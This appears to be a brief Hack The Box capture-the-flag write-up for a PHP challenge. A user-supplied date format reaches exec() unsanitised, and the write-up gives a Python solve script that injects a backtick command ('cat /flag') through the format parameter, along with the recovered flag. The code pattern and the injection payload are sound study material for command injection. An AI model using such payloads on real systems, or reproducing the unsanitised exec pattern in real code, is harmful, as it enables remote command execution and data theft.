---
created: 2024-07-16T22:50
updated: 2024-07-16T22:56
---

## Analysis

`TimeModel` is the most obvious attack surface, it runs user supplied format in `exec`.

```php [TimeModel.php]
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

## Solve Script

```python
import requests
import re
payload = "'`cat /flag`'"
r = requests.get("http://94.237.59.199:39808/?format="+payload)
print(re.search("HTB{.*}", r.text).group(0))
# HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_33e95b9ffd98a08268d47ea25f327da1}
```

### Explanation

When we supply the following to format, we are able to embed a command execution that gives us the flag.

```
'`cat /flag`'
```

```php
$this->command = "date '+" . $format . "' 2>&1";
$this->command = "date '+'`cat /flag`'' 2>&1"; # will become
```

Not sure if existence of special characters might mess up the flag.
